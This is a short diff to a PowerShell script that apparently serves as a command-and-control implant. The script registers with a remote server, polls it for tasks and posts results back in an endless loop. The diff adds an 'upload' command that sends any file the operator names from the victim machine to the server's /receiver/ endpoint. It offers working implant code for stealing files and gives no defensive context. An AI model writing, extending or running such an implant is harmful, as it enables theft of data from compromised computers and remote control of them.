@@ -92,6 +92,7 @@ $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POS
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
+$uploadl = ("http" + ':' + "//$ip" + ':' + "$port/receiver/$name")
 
 for (;;){
     
@@ -135,6 +136,13 @@ for (;;){
                 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
 
+            }
+            elseif ($command -eq "upload"){
+
+                $sourceFilePath = $args[0]
+                $webClient = New-Object System.Net.WebClient;
+                $webClient.UploadFile($uploadl, "POST", $sourceFilePath);                 
+                
             }
             elseif ($command -eq "sleep"){
 
